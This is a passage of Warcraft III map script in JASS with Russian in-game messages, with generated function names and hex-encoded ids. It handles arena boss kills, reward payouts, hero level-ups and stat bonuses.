call SetHeroLevel(GetEnumUnit(),GetUnitLevel(GetEnumUnit())+2,false)
set Tm[GetConvertedPlayerId(GetOwningPlayer(GetEnumUnit()))]=Tm[GetConvertedPlayerId(GetOwningPlayer(GetEnumUnit()))]+2
set NJ[GetConvertedPlayerId(GetOwningPlayer(GetEnumUnit()))]=NJ[GetConvertedPlayerId(GetOwningPlayer(GetEnumUnit()))]+900
set NK[GetConvertedPlayerId(GetOwningPlayer(GetEnumUnit()))]=NK[GetConvertedPlayerId(GetOwningPlayer(GetEnumUnit()))]+45
else
endif
endfunction
function B5o takes nothing returns boolean
if not (GetUnitTypeId(GetTriggerUnit())==$6E30334D) then
return false
endif
return true
endfunction
function B5p takes nothing returns boolean
return IsUnitType(GetFilterUnit(),UNIT_TYPE_HERO)==true
endfunction
function B5q takes nothing returns boolean
if not (UnitHasItemOfTypeBJ(GetEnumUnit(),$49304739)==true) then
return false
endif
if not (GetUnitAbilityLevel(GetEnumUnit(),$41314452)==2) then
return false
endif
if not (IsUnitAliveBJ(GetEnumUnit())==true) then
return false
endif
if not (GetUnitLevel(GetEnumUnit())>=11) then
return false
endif
if not (GetUnitLevel(GetEnumUnit())<=15) then
return false
endif
return true
endfunction
function B5r takes nothing returns nothing
if B5q() then
call SetUnitAbilityLevelSwapped($41314452,GetEnumUnit(),3)
call RemoveItem(GetItemOfTypeFromUnitBJ(GetEnumUnit(),$49304739))
set NF=false
call UnitAddItemByIdSwapped($49304E43,GetEnumUnit())
set NF=true
call SetHeroLevel(GetEnumUnit(),GetUnitLevel(GetEnumUnit())+2,false)
set Tm[GetConvertedPlayerId(GetOwningPlayer(GetEnumUnit()))]=Tm[GetConvertedPlayerId(GetOwningPlayer(GetEnumUnit()))]+2
set NJ[GetConvertedPlayerId(GetOwningPlayer(GetEnumUnit()))]=NJ[GetConvertedPlayerId(GetOwningPlayer(GetEnumUnit()))]+1200
set NK[GetConvertedPlayerId(GetOwningPlayer(GetEnumUnit()))]=NK[GetConvertedPlayerId(GetOwningPlayer(GetEnumUnit()))]+60
else
endif
endfunction
function B5s takes nothing returns boolean
if not (GetUnitTypeId(GetTriggerUnit())==$6E30334F) then
return false
endif
return true
endfunction
function B5t takes nothing returns boolean
return IsUnitType(GetFilterUnit(),UNIT_TYPE_HERO)==true
endfunction
function B5u takes nothing returns boolean
if not (UnitHasItemOfTypeBJ(GetEnumUnit(),$49304E43)==true) then
return false
endif
if not (GetUnitAbilityLevel(GetEnumUnit(),$41314452)==3) then
return false
endif
if not (IsUnitAliveBJ(GetEnumUnit())==true) then
return false
endif
if not (GetUnitLevel(GetEnumUnit())>=16) then
return false
endif
if not (GetUnitLevel(GetEnumUnit())<=20) then
return false
endif
return true
endfunction
function B5v takes nothing returns nothing
if B5u() then
call RemoveItem(GetItemOfTypeFromUnitBJ(GetEnumUnit(),$49304E43))
call SetUnitAbilityLevelSwapped($41314452,GetEnumUnit(),4)
set NF=false
call UnitAddItemByIdSwapped($49304E44,GetEnumUnit())
set NF=true
call SetHeroLevel(GetEnumUnit(),GetUnitLevel(GetEnumUnit())+2,false)
set Tm[GetConvertedPlayerId(GetOwningPlayer(GetEnumUnit()))]=Tm[GetConvertedPlayerId(GetOwningPlayer(GetEnumUnit()))]+2
set NJ[GetConvertedPlayerId(GetOwningPlayer(GetEnumUnit()))]=NJ[GetConvertedPlayerId(GetOwningPlayer(GetEnumUnit()))]+1800
set NK[GetConvertedPlayerId(GetOwningPlayer(GetEnumUnit()))]=NK[GetConvertedPlayerId(GetOwningPlayer(GetEnumUnit()))]+90
else
endif
endfunction
function B5w takes nothing returns boolean
if not (GetUnitTypeId(GetTriggerUnit())==$6E303350) then
return false
endif
return true
endfunction
function B5x takes nothing returns boolean
return IsUnitType(GetFilterUnit(),UNIT_TYPE_HERO)==true
endfunction
function B5y takes nothing returns boolean
if not (UnitHasItemOfTypeBJ(GetEnumUnit(),$49304E44)==true) then
return false
endif
if not (GetUnitAbilityLevel(GetEnumUnit(),$41314452)==4) then
return false
endif
if not (IsUnitAliveBJ(GetEnumUnit())==true) then
return false
endif
if not (GetUnitLevel(GetEnumUnit())>=21) then
return false
endif
if not (GetUnitLevel(GetEnumUnit())<=25) then
return false
endif
return true
endfunction
function B5z takes nothing returns nothing
if B5y() then
call RemoveItem(GetItemOfTypeFromUnitBJ(GetEnumUnit(),$49304E44))
call SetUnitAbilityLevelSwapped($41314452,GetEnumUnit(),5)
set NF=false
call UnitAddItemByIdSwapped($49304E46,GetEnumUnit())
set NF=true
call SetHeroLevel(GetEnumUnit(),GetUnitLevel(GetEnumUnit())+2,false)
set Tm[GetConvertedPlayerId(GetOwningPlayer(GetEnumUnit()))]=Tm[GetConvertedPlayerId(GetOwningPlayer(GetEnumUnit()))]+2
set NJ[GetConvertedPlayerId(GetOwningPlayer(GetEnumUnit()))]=NJ[GetConvertedPlayerId(GetOwningPlayer(GetEnumUnit()))]+2100
set NK[GetConvertedPlayerId(GetOwningPlayer(GetEnumUnit()))]=NK[GetConvertedPlayerId(GetOwningPlayer(GetEnumUnit()))]+120
else
endif
endfunction
function B50 takes nothing returns boolean
if not (GetUnitTypeId(GetTriggerUnit())==$6E303351) then
return false
endif
return true
endfunction
function B51 takes nothing returns boolean
return IsUnitType(GetFilterUnit(),UNIT_TYPE_HERO)==true
endfunction
function B52 takes nothing returns boolean
if not (UnitHasItemOfTypeBJ(GetEnumUnit(),$49304E46)==true) then
return false
endif
if not (GetUnitAbilityLevel(GetEnumUnit(),$41314452)==5) then
return false
endif
if not (IsUnitAliveBJ(GetEnumUnit())==true) then
return false
endif
if not (GetUnitLevel(GetEnumUnit())>=26) then
return false
endif
if not (GetUnitLevel(GetEnumUnit())<=30) then
return false
endif
return true
endfunction
function B53 takes nothing returns nothing
if B52() then
call RemoveItem(GetItemOfTypeFromUnitBJ(GetEnumUnit(),$49304E46))
call SetUnitAbilityLevelSwapped($41314452,GetEnumUnit(),6)
set NF=false
call UnitAddItemByIdSwapped($49304E47,GetEnumUnit())
set NF=true
call SetHeroLevel(GetEnumUnit(),GetUnitLevel(GetEnumUnit())+2,false)
set Tm[GetConvertedPlayerId(GetOwningPlayer(GetEnumUnit()))]=Tm[GetConvertedPlayerId(GetOwningPlayer(GetEnumUnit()))]+2
set NJ[GetConvertedPlayerId(GetOwningPlayer(GetEnumUnit()))]=NJ[GetConvertedPlayerId(GetOwningPlayer(GetEnumUnit()))]+3000
set NK[GetConvertedPlayerId(GetOwningPlayer(GetEnumUnit()))]=NK[GetConvertedPlayerId(GetOwningPlayer(GetEnumUnit()))]+150
else
endif
endfunction
function B54 takes nothing returns boolean
if not (GetUnitTypeId(GetTriggerUnit())==$75303048) then
return false
endif
return true
endfunction
function B55 takes nothing returns boolean
return IsUnitType(GetFilterUnit(),UNIT_TYPE_HERO)==true
endfunction
function B56 takes nothing returns boolean
if not (UnitHasItemOfTypeBJ(GetEnumUnit(),$49304E47)==true) then
return false
endif
if not (GetUnitAbilityLevel(GetEnumUnit(),$41314452)==6) then
return false
endif
if not (IsUnitAliveBJ(GetEnumUnit())==true) then
return false
endif
if not (GetUnitLevel(GetEnumUnit())>=31) then
return false
endif
if not (GetUnitLevel(GetEnumUnit())<=35) then
return false
endif
return true
endfunction
function B57 takes nothing returns nothing
if B56() then
call RemoveItem(GetItemOfTypeFromUnitBJ(GetEnumUnit(),$49304E47))
call SetUnitAbilityLevelSwapped($41314452,GetEnumUnit(),7)
set NF=false
call UnitAddItemByIdSwapped($49304E48,GetEnumUnit())
set NF=true
call SetHeroLevel(GetEnumUnit(),GetUnitLevel(GetEnumUnit())+2,false)
set Tm[GetConvertedPlayerId(GetOwningPlayer(GetEnumUnit()))]=Tm[GetConvertedPlayerId(GetOwningPlayer(GetEnumUnit()))]+2
set NJ[GetConvertedPlayerId(GetOwningPlayer(GetEnumUnit()))]=NJ[GetConvertedPlayerId(GetOwningPlayer(GetEnumUnit()))]+4500
set NK[GetConvertedPlayerId(GetOwningPlayer(GetEnumUnit()))]=NK[GetConvertedPlayerId(GetOwningPlayer(GetEnumUnit()))]+180
else
endif
endfunction
function B58 takes nothing returns boolean
if not (GetUnitTypeId(GetTriggerUnit())==$68303056) then
return false
endif
return true
endfunction
function B59 takes nothing returns boolean
return IsUnitType(GetFilterUnit(),UNIT_TYPE_HERO)==true
endfunction
function B6B takes nothing returns boolean
if not (UnitHasItemOfTypeBJ(GetEnumUnit(),$49304E48)==true) then
return false
endif
if not (GetUnitAbilityLevel(GetEnumUnit(),$41314452)==7) then
return false
endif
if not (IsUnitAliveBJ(GetEnumUnit())==true) then
return false
endif
if not (GetUnitLevel(GetEnumUnit())>=36) then
return false
endif
if not (GetUnitLevel(GetEnumUnit())<=40) then
return false
endif
return true
endfunction
function B6C takes nothing returns nothing
if B6B() then
call RemoveItem(GetItemOfTypeFromUnitBJ(GetEnumUnit(),$49304E48))
call SetUnitAbilityLevelSwapped($41314452,GetEnumUnit(),8)
set NF=false
call UnitAddItemByIdSwapped($49304E4A,GetEnumUnit())
set NF=true
call SetHeroLevel(GetEnumUnit(),GetUnitLevel(GetEnumUnit())+2,false)
set Tm[GetConvertedPlayerId(GetOwningPlayer(GetEnumUnit()))]=Tm[GetConvertedPlayerId(GetOwningPlayer(GetEnumUnit()))]+2
set NJ[GetConvertedPlayerId(GetOwningPlayer(GetEnumUnit()))]=NJ[GetConvertedPlayerId(GetOwningPlayer(GetEnumUnit()))]+6000
set NK[GetConvertedPlayerId(GetOwningPlayer(GetEnumUnit()))]=NK[GetConvertedPlayerId(GetOwningPlayer(GetEnumUnit()))]+210
else
endif
endfunction
function B6D takes nothing returns boolean
if not (GetUnitTypeId(GetTriggerUnit())==$6830305A) then
return false
endif
return true
endfunction
function B6E takes nothing returns boolean
return IsUnitType(GetFilterUnit(),UNIT_TYPE_HERO)==true
endfunction
function B6F takes nothing returns boolean
if not (UnitHasItemOfTypeBJ(GetEnumUnit(),$49304E4A)==true) then
return false
endif
if not (GetUnitAbilityLevel(GetEnumUnit(),$41314452)==8) then
return false
endif
if not (IsUnitAliveBJ(GetEnumUnit())==true) then
return false
endif
if not (GetUnitLevel(GetEnumUnit())>=41) then
return false
endif
if not (GetUnitLevel(GetEnumUnit())<=45) then
return false
endif
return true
endfunction
function B6G takes nothing returns nothing
if B6F() then
call RemoveItem(GetItemOfTypeFromUnitBJ(GetEnumUnit(),$49304E4A))
call SetUnitAbilityLevelSwapped($41314452,GetEnumUnit(),9)
set NF=false
call UnitAddItemByIdSwapped($49304E49,GetEnumUnit())
set NF=true
call SetHeroLevel(GetEnumUnit(),GetUnitLevel(GetEnumUnit())+2,false)
set Tm[GetConvertedPlayerId(GetOwningPlayer(GetEnumUnit()))]=Tm[GetConvertedPlayerId(GetOwningPlayer(GetEnumUnit()))]+2
set NJ[GetConvertedPlayerId(GetOwningPlayer(GetEnumUnit()))]=NJ[GetConvertedPlayerId(GetOwningPlayer(GetEnumUnit()))]+7500
set NK[GetConvertedPlayerId(GetOwningPlayer(GetEnumUnit()))]=NK[GetConvertedPlayerId(GetOwningPlayer(GetEnumUnit()))]+300
else
endif
endfunction
function B6H takes nothing returns boolean
if not (GetUnitTypeId(GetTriggerUnit())==$68303130) then
return false
endif
return true
endfunction
function B6I takes nothing returns boolean
return IsUnitType(GetFilterUnit(),UNIT_TYPE_HERO)==true
endfunction
function B6J takes nothing returns boolean
if not (GetUnitLevel(GetEnumUnit())<50) then
return false
endif
return true
endfunction
function B6K takes nothing returns boolean
if not (GetUnitLevel(GetEnumUnit())<49) then
return false
endif
return true
endfunction
function B6L takes nothing returns boolean
if not (UnitHasItemOfTypeBJ(GetEnumUnit(),$49304E49)==true) then
return false
endif
if not (GetUnitAbilityLevel(GetEnumUnit(),$41314452)==9) then
return false
endif
if not (IsUnitAliveBJ(GetEnumUnit())==true) then
return false
endif
if not (GetUnitLevel(GetEnumUnit())>=46) then
return false
endif
if not (GetUnitLevel(GetEnumUnit())<=50) then
return false
endif
return true
endfunction
function B6M takes nothing returns nothing
if B6L() then
call RemoveItem(GetItemOfTypeFromUnitBJ(GetEnumUnit(),$49304E49))
call SetUnitAbilityLevelSwapped($41314452,GetEnumUnit(),10)
set NF=false
call UnitAddItemByIdSwapped($49304E45,GetEnumUnit())
set NF=true
if B6K() then
call SetHeroLevel(GetEnumUnit(),GetUnitLevel(GetEnumUnit())+2,false)
set Tm[GetConvertedPlayerId(GetOwningPlayer(GetEnumUnit()))]=Tm[GetConvertedPlayerId(GetOwningPlayer(GetEnumUnit()))]+2
else
if B6J() then
call SetHeroLevel(GetEnumUnit(),50,false)
set Tm[GetConvertedPlayerId(GetOwningPlayer(GetEnumUnit()))]=50
else
endif
endif
set NJ[GetConvertedPlayerId(GetOwningPlayer(GetEnumUnit()))]=NJ[GetConvertedPlayerId(GetOwningPlayer(GetEnumUnit()))]+9000
set NK[GetConvertedPlayerId(GetOwningPlayer(GetEnumUnit()))]=NK[GetConvertedPlayerId(GetOwningPlayer(GetEnumUnit()))]+450
else
endif
endfunction
function B6N takes nothing returns boolean
if not (GetUnitTypeId(GetTriggerUnit())==$68303059) then
return false
endif
return true
endfunction
function B6O takes nothing returns boolean
if not (GetRandomInt(1,4)==1) then
return false
endif
return true
endfunction
function B6P takes nothing returns boolean
if not (GetRandomInt(1,4)==1) then
return false
endif
return true
endfunction
function B6Q takes nothing returns boolean
if not (GetRandomInt(1,4)==1) then
return false
endif
return true
endfunction
function B6R takes nothing returns boolean
if not (GetRandomInt(1,20)==1) then
return false
endif
return true
endfunction
function B6S takes nothing returns boolean
return IsUnitType(GetFilterUnit(),UNIT_TYPE_HERO)==true
endfunction
function B6T takes nothing returns boolean
if not (GetUnitAbilityLevel(GetEnumUnit(),$41314452)==10) then
return false
endif
return true
endfunction
function B6U takes nothing returns nothing
if B6T() then
set NJ[GetConvertedPlayerId(GetOwningPlayer(GetEnumUnit()))]=NJ[GetConvertedPlayerId(GetOwningPlayer(GetEnumUnit()))]+12000
call SetUnitAbilityLevelSwapped($41314452,GetEnumUnit(),11)
set NK[GetConvertedPlayerId(GetOwningPlayer(GetEnumUnit()))]=NK[GetConvertedPlayerId(GetOwningPlayer(GetEnumUnit()))]+600
else
endif
endfunction
function B6V takes nothing returns boolean
if not (GetUnitTypeId(GetTriggerUnit())==$68303554) then
return false
endif
return true
endfunction
function B6W takes nothing returns nothing
call SetUnitPositionLoc(Js,GetRectCenter(Ez))
if B5k() then
call EnableTrigger(co)
set TR[1]=0
set TR[2]=0
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_REQUIREMENT,"Ну вот Вы и освоили Арену. Рад за вас, Герои.")
call DestroyEffectBJ(Us[52])
call AddSpecialEffectTargetUnitBJ("overhead",Ks,"war3mapImported\\QuestYellow1.mdx")
set Us[52]=GetLastCreatedEffectBJ()
call CreateItemLoc($73656872,GetRectCenter(FC))
call DisplayTextToForce(GetPlayersAll(),"Все, кто остался в живых на арене,получили по |c00ff00ff700|r опыта, |c00ffff00200|r золота, |c00ff969610|r кровавых меток.")
set SR=GetUnitsInRectMatching(FC,Condition(function B5h))
call ForGroupBJ(SR,function B5j)
call DestroyGroup(SR)
else
endif
if B5o() then
call EnableTrigger(co)
set TR[1]=0
set TR[2]=0
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_REQUIREMENT,"Ну вот Вы и освоили Арену. Рад за вас, Герои.")
call DestroyEffectBJ(Us[52])
call AddSpecialEffectTargetUnitBJ("overhead",Ks,"war3mapImported\\QuestYellow1.mdx")
set Us[52]=GetLastCreatedEffectBJ()
call CreateItemLoc($77696C64,GetRectCenter(FC))
call DisplayTextToForce(GetPlayersAll(),"Все, кто остался в живых на арене,получили по |c00ff00ff1000|r опыта, |c00ffff00300|r золота, |c00ff969615|r кровавых меток.")
set SR=GetUnitsInRectMatching(FC,Condition(function B5l))
call ForGroupBJ(SR,function B5n)
call DestroyGroup(SR)
else
endif
if B5s() then
call EnableTrigger(co)
set TR[1]=0
set TR[2]=0
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_REQUIREMENT,"Ну вот Вы и освоили Арену. Рад за вас, Герои.")
call DestroyEffectBJ(Us[52])
call AddSpecialEffectTargetUnitBJ("overhead",Ks,"war3mapImported\\QuestYellow1.mdx")
set Us[52]=GetLastCreatedEffectBJ()
call CreateItemLoc($7370726E,GetRectCenter(FC))
call DisplayTextToForce(GetPlayersAll(),"Все, кто остался в живых на арене,получили по |c00ff00ff1500|r опыта, |c00ffff00400|r золота, |c00ff969620|r кровавых меток.")
set SR=GetUnitsInRectMatching(FC,Condition(function B5p))
call ForGroupBJ(SR,function B5r)
call DestroyGroup(SR)
else
endif
if B5w() then
call EnableTrigger(co)
set TR[1]=0
set TR[2]=0
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_REQUIREMENT,"Ну вот Вы и освоили Арену. Рад за вас, Герои.")
call DestroyEffectBJ(Us[52])
call AddSpecialEffectTargetUnitBJ("overhead",Ks,"war3mapImported\\QuestYellow1.mdx")
set Us[52]=GetLastCreatedEffectBJ()
call CreateItemLoc($776E6575,GetRectCenter(FC))
call DisplayTextToForce(GetPlayersAll(),"Все, кто остался в живых на арене,получили по |c00ff00ff1800|r опыта, |c00ffff00600|r золота, |c00ff969630|r кровавых меток.")
set SR=GetUnitsInRectMatching(FC,Condition(function B5t))
call ForGroupBJ(SR,function B5v)
call DestroyGroup(SR)
else
endif
if B50() then
call EnableTrigger(co)
set TR[1]=0
set TR[2]=0
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_REQUIREMENT,"Ну вот Вы и освоили Арену. Рад за вас, Герои.")
call DestroyEffectBJ(Us[52])
call AddSpecialEffectTargetUnitBJ("overhead",Ks,"war3mapImported\\QuestYellow1.mdx")
set Us[52]=GetLastCreatedEffectBJ()
call CreateItemLoc($72737431,GetRectCenter(FC))
call DisplayTextToForce(GetPlayersAll(),"Все, кто остался в живых на арене,получили по |c00ff00ff2200|r опыта, |c00ffff00700|r золота, |c00ff969640|r кровавых меток.")
set SR=GetUnitsInRectMatching(FC,Condition(function B5x))
call ForGroupBJ(SR,function B5z)
call DestroyGroup(SR)
else
endif
if B54() then
call EnableTrigger(co)
set TR[1]=0
set TR[2]=0
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_REQUIREMENT,"Ну вот Вы и освоили Арену. Рад за вас, Герои.")
call DestroyEffectBJ(Us[52])
call AddSpecialEffectTargetUnitBJ("overhead",Ks,"war3mapImported\\QuestYellow1.mdx")
set Us[52]=GetLastCreatedEffectBJ()
call CreateItemLoc($62726163,GetRectCenter(FC))
call DisplayTextToForce(GetPlayersAll(),"Все, кто остался в живых на арене,получили по |c00ff00ff2900|r опыта, |c00ffff001000|r золота, |c00ff969650|r кровавых меток.")
set SR=GetUnitsInRectMatching(FC,Condition(function B51))
call ForGroupBJ(SR,function B53)
call DestroyGroup(SR)
else
endif
if B58() then
call EnableTrigger(co)
set TR[1]=0
set TR[2]=0
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_REQUIREMENT,"Ну вот Вы и освоили Арену. Рад за вас, Герои.")
call DestroyEffectBJ(Us[52])
call AddSpecialEffectTargetUnitBJ("overhead",Ks,"war3mapImported\\QuestYellow1.mdx")
set Us[52]=GetLastCreatedEffectBJ()
call CreateItemLoc($61666163,GetRectCenter(FC))
call DisplayTextToForce(GetPlayersAll(),"Все, кто остался в живых на арене,получили по |c00ff00ff3500|r опыта, |c00ffff001500|r золота, |c00ff969660|r кровавых меток.")
set SR=GetUnitsInRectMatching(FC,Condition(function B55))
call ForGroupBJ(SR,function B57)
call DestroyGroup(SR)
else
endif
if B6D() then
call EnableTrigger(co)
set TR[1]=0
set TR[2]=0
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_REQUIREMENT,"Ну вот Вы и освоили Арену. Рад за вас, Герои.")
call DestroyEffectBJ(Us[52])
call AddSpecialEffectTargetUnitBJ("overhead",Ks,"war3mapImported\\QuestYellow1.mdx")
set Us[52]=GetLastCreatedEffectBJ()
call CreateItemLoc($77737764,GetRectCenter(FC))
call DisplayTextToForce(GetPlayersAll(),"Все, кто остался в живых на арене,получили по |c00ff00ff4500|r опыта, |c00ffff002000|r золота, |c00ff969670|r кровавые метки.")
set SR=GetUnitsInRectMatching(FC,Condition(function B59))
call ForGroupBJ(SR,function B6C)
call DestroyGroup(SR)
else
endif
if B6H() then
call EnableTrigger(co)
set TR[1]=0
set TR[2]=0
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_REQUIREMENT,"Ну вот Вы и освоили Арену. Рад за вас, Герои.")
call DestroyEffectBJ(Us[52])
call AddSpecialEffectTargetUnitBJ("overhead",Ks,"war3mapImported\\QuestYellow1.mdx")
set Us[52]=GetLastCreatedEffectBJ()
call CreateItemLoc($77687764,GetRectCenter(FC))
call DisplayTextToForce(GetPlayersAll(),"Все, кто остался в живых на арене,получили по |c00ff00ff6000|r опыта, |c00ffff002500|r золота, |c00ff9696100|r кровавые метки.")
set SR=GetUnitsInRectMatching(FC,Condition(function B6E))
call ForGroupBJ(SR,function B6G)
call DestroyGroup(SR)
else
endif
if B6N() then
call EnableTrigger(co)
set TR[1]=0
set TR[2]=0
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_REQUIREMENT,"Ну вот Вы и освоили Арену. Рад за вас, Герои.")
call DestroyEffectBJ(Us[52])
call AddSpecialEffectTargetUnitBJ("overhead",Ks,"war3mapImported\\QuestYellow1.mdx")
set Us[52]=GetLastCreatedEffectBJ()
call CreateItemLoc($6876616C,GetRectCenter(FC))
call DisplayTextToForce(GetPlayersAll(),"Все, кто остался в живых на арене,получили по |c00ff00ff10000|r опыта, |c00ffff003000|r золота, |c00ff9696150|r кровавых меток.")
set SR=GetUnitsInRectMatching(FC,Condition(function B6I))
call ForGroupBJ(SR,function B6M)
call DestroyGroup(SR)
else
endif
if B6V() then
call EnableTrigger(co)
set TR[1]=0
set TR[2]=0
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_REQUIREMENT,"Ну вот Вы и освоили Арену. Рад за вас, Герои.")
call DestroyEffectBJ(Us[52])
call AddSpecialEffectTargetUnitBJ("overhead",Ks,"war3mapImported\\QuestYellow1.mdx")
set Us[52]=GetLastCreatedEffectBJ()
call CreateItemLoc($676D6672,GetRectCenter(FC))
call SetItemUserData(GetLastCreatedItem(),10)
if B6O() then
call CreateItemLoc($49305552,GetRectCenter(FC))
call SetItemUserData(GetLastCreatedItem(),10)
else
endif
if B6P() then
call CreateItemLoc($49305554,GetRectCenter(FC))
call SetItemUserData(GetLastCreatedItem(),10)
else
endif
if B6Q() then
call CreateItemLoc($49305550,GetRectCenter(FC))
call SetItemUserData(GetLastCreatedItem(),10)
else
endif
if B6R() then
call CreateItemLoc($4930544F,GetRectCenter(FC))
call SetItemUserData(GetLastCreatedItem(),10)
call CreateTextTagUnitBJ("Удача! Вам выпал |c00ff9696\"Bomb\"",GetTriggerUnit(),0,15.,100.,100.,100.,0)
call SetTextTagVelocityBJ(GetLastCreatedTextTag(),72.,90)
call SetTextTagPermanentBJ(GetLastCreatedTextTag(),false)
call SetTextTagFadepointBJ(GetLastCreatedTextTag(),3.)
call SetTextTagLifespanBJ(GetLastCreatedTextTag(),3.)
else
endif
call DisplayTextToForce(GetPlayersAll(),"Все, кто остался в живых на арене,получили по |c00ffff004000|r золота, |c00ff9696200|r кровавых меток.")
set SR=GetUnitsInRectMatching(FC,Condition(function B6S))
call ForGroupBJ(SR,function B6U)
call DestroyGroup(SR)
else
endif
endfunction
function B6X takes nothing returns nothing
set i1=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(i1,EVENT_PLAYER_UNIT_DEATH)
call TriggerAddCondition(i1,Condition(function B5g))
call TriggerAddAction(i1,function B6W)
endfunction
function B6Y takes nothing returns nothing
local unit Hu=GetEnumUnit()
local integer L9
if GetOwningPlayer(Hu)==Player(11) then
call UnitAddAbility(Hu,$41313756)
set L9=GetUnitLevel(Hu)*3+GetUnitAbilityLevel(Hu,$42303232)
call SetUnitAbilityLevel(Hu,$41313756,L9)
endif
set Hu=null
endfunction
function B6Z takes nothing returns nothing
local group Na=CreateGroup()
local boolexpr Nb=Condition(function mx)
call GroupEnumUnitsInRect(Na,GetPlayableMapRect(),Nb)
call DestroyBoolExpr(Nb)
call ForGroup(Na,function B6Y)
call DestroyGroup(Na)
set Nb=null
set Na=null
endfunction
function B6a takes unit Hu returns nothing
local integer Ma=GetPlayerId(GetOwningPlayer(Hu))
if GetUnitTypeId(NL[2+2*Ma])==$6E30384B then
call ni(Hu,0,0,0,0,0,0,"+100 стат, 4000 МР, 450 атк, 70 зщ.",100,100,100)
call UnitAddAbility(MT[Ma],$4131374F)
call UnitAddAbility(MT[Ma],$41303458)
call UnitAddAbility(MT[Ma],$41305050)
elseif GetUnitTypeId(NL[2+2*Ma])==$6E303835 then
set hP[Ma+1]="+4000 МР"
call UnitAddAbility(MT[Ma],$41304F57)
elseif GetUnitTypeId(NL[2+2*Ma])==$6E303834 then
set hP[Ma+1]="+70 защиты"
call UnitAddAbility(MT[Ma],$41303458)
elseif GetUnitTypeId(NL[2+2*Ma])==$6E303833 then
set hP[Ma+1]="+450 атаки"
call UnitAddAbility(MT[Ma],$41305050)
elseif GetUnitTypeId(NL[2+2*Ma])==$6E303532 then
set hP[Ma+1]="+50 стат, +2000 НР, МР"
call UnitAddAbility(MT[Ma],$41304337)
call UnitAddAbility(MT[Ma],$41304339)
call ni(Hu,0,0,0,0,0,0,"+50 стат, +2000 НР, МР",50,50,50)
elseif GetUnitTypeId(NL[2+2*Ma])==$6E303531 then
call ni(Hu,0,0,0,0,0,0,"+50 стат",50,50,50)
elseif GetUnitTypeId(NL[2+2*Ma])==$6E303832 then
set hP[Ma+1]="+2000 МР"
call UnitAddAbility(MT[Ma],$4131374F)
elseif GetUnitTypeId(NL[2+2*Ma])==$6E303830 then
set hP[Ma+1]="+35 защиты"
call UnitAddAbility(MT[Ma],$4131374E)
elseif GetUnitTypeId(NL[2+2*Ma])==$6E303831 then
set hP[Ma+1]="+200 атаки"
call UnitAddAbility(MT[Ma],$4131374D)
elseif GetUnitTypeId(NL[2+2*Ma])==$6E303746 then
call ni(Hu,.03,.03,.03,.03,.03,3,"+200 стат, 3% Экстрактов",200,200,200)
elseif GetUnitTypeId(NL[2+2*Ma])==$6E303743 then
call ni(Hu,0,0,0,.04,.04,0,"+300 разума, 4% Магии, Жизни",0,0,300)
call SetUnitAbilityLevel(NL[2+2*Ma],$41313536,2)
elseif GetUnitTypeId(NL[2+2*Ma])==$6E303742 then
call ni(Hu,0,0,.05,0,0,0,"+300 ловкости, 5% Разрушения",0,300,0)
call SetUnitAbilityLevel(NL[2+2*Ma],$41313536,2)
elseif GetUnitTypeId(NL[2+2*Ma])==$6E303741 then
call ni(Hu,.04,.04,0,0,0,0,"+300 силы, 4% Силы, Защиты",300,0,0)
call SetUnitAbilityLevel(NL[2+2*Ma],$41313536,2)
elseif GetUnitTypeId(NL[2+2*Ma])==$6E30384D then
call ni(Hu,.06,.06,.06,.06,.06,6,"+200 стат, 6% Экстрактов",200,200,200)
elseif GetUnitTypeId(NL[2+2*Ma])==$6E30384E then
call ni(Hu,.08,.08,.08,.08,.08,8,"+250 стат, 8% Экстрактов",250,250,250)
call SetUnitAbilityLevel(NL[2+2*Ma],$41304347,2)
elseif GetUnitTypeId(NL[2+2*Ma])==$6E30384F then
call ni(Hu,.11,.11,.11,.11,.11,11,"+300 стат, 11% Экстрактов",300,300,300)
call SetUnitAbilityLevel(NL[2+2*Ma],$41304347,3)
elseif GetUnitTypeId(NL[2+2*Ma])==$6E303449 then
call ni(Hu,.13,.13,.13,.13,.13,13,"+350 стат, 13% Экстрактов",350,350,350)
call SetUnitAbilityLevel(NL[2+2*Ma],$41304347,4)
elseif GetUnitTypeId(NL[2+2*Ma])==$6E303850 then
call ni(Hu,.07,.07,0,0,0,0,"+400 Силы, 7% Силы, защиты",400,0,0)
call SetUnitAbilityLevel(NL[2+2*Ma],$41313536,3)
elseif GetUnitTypeId(NL[2+2*Ma])==$6E303851 then
call ni(Hu,0,0,0,.07,.07,0,"+400 разума, 7% Магии, Жизни",0,0,400)
call SetUnitAbilityLevel(NL[2+2*Ma],$41313536,3)
elseif GetUnitTypeId(NL[2+2*Ma])==$6E303852 then
call ni(Hu,0,0,.09,0,0,0,"+400 ловкости, 9% разрушения",300,300,300)
call SetUnitAbilityLevel(NL[2+2*Ma],$41313536,3)
elseif GetUnitTypeId(NL[2+2*Ma])==$6E303853 then
call ni(Hu,.09,.09,.09,.09,.09,9,"+450 стат, 9% Экстрактов",450,450,450)
call SetUnitAbilityLevel(NL[2+2*Ma],$41313536,4)
elseif GetUnitTypeId(NL[2+2*Ma])==$6E303533 then
call ni(Hu,0,0,0,0,0,0,"+120 стат",120,120,120)
elseif GetUnitTypeId(NL[2+2*Ma])==$6E30364F then
call ni(Hu,0,0,0,0,0,0,"+25 стат",25,25,25)
elseif GetUnitTypeId(NL[2+2*Ma])==$6E303632 then
call ni(Hu,0,0,0,0,0,0,"+60 стат",60,60,60)
elseif GetUnitTypeId(NL[2+2*Ma])==$6E303349 then
call ni(Hu,.03,.03,.03,.03,.03,3,"+80 стат, 3% к Экстрактам",80,80,80)
elseif GetUnitTypeId(NL[2+2*Ma])==$6E30334B then
call ni(Hu,.06,.06,.06,.06,.06,6,"+130 стат, 6% к Экстрактам",130,130,130)
elseif GetUnitTypeId(NL[2+2*Ma])==$6E303348 then
call ni(Hu,.1,.1,.1,.1,.1,10,"+160 стат, 10% к Экстрактам",160,160,160)
